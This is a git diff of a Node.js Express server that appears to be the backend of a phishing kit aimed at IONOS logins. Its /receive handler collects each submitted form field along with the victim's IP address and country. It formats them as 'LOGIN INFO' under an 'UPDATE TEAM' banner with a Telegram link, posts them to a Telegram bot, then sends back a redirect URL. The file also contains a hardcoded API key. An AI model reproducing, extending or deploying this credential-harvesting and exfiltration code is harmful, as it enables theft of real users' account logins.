@@ -12,7 +12,7 @@ const PORT = process.env.PORT || 3000;
 
 const API_KEY = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const { botToken, chatId, url } = require('./config/settings.js');
-
+console.log(url);
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
@@ -64,20 +64,29 @@ app.post('/receive', async (req, res) => {
     const userAgent = req.headers['user-agent'];
     const systemLang = req.headers['accept-language'];
 
-    let message = `🌍 Geo-IP Data:\n`;
-    message += `IP Address: ${geoData?.ip || 'Unknown'}\n`;
-    message += `Country: ${geoData?.country?.name || 'Unknown'}\n`;
-
-    Object.keys(req.body).forEach((key) => {
-        message += `${key}: ${req.body[key]}\n`;
-    });
+    
+    let message = `👤 LOGIN INFO\n\n`;
+		message += `========================\n\n`;
+		message += `IP Address: ${geoData?.ip || 'Unknown'}\n`;
+		message += `Country: ${geoData?.country?.name || 'Unknown'}\n`;
+		
+		Object.keys(req.body).forEach((key) => {
+		    message += `${key}: ${req.body[key]}\n`;
+		});
+		
+		message += `========================\n`;
+		message += `✅ UPDATE TEAM | IONOS \n`;
+		message += `💬 Telegram: https://t.me/UpdateTeams\n`;
+		
+		console.log(message);
 
     try {
         await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             chat_id: chatId,
             text: message,
         });
-        res.status(200).send(url);
+        console.log('URL:', url);
+		res.status(200).send(url);
     } catch (error) {
         console.error('Telegram Error:', error.message);
         res.status(500).send('Error sending message');
